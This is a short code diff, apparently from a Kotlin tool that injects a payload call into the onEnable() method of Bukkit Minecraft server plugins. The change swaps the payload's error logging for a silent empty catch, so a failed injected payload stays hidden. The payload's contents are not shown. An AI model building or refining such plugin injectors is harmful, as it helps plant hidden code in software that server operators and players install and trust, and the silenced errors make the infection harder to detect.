@@ -200,10 +200,7 @@ fun process(
         val codeToInsert = """
             try {
                 new $finalMainPayloadCallName((org.bukkit.plugin.Plugin)this);
-            } catch (Throwable throwable) {
-                System.err.println("[Injector] Payload Error:");
-                throwable.printStackTrace();
-            }
+            } catch (Throwable ignored) { }
         """.trimIndent()
 
         Logs.info("Injecting code into ${pluginMainClass}.onEnable(): { $codeToInsert }")
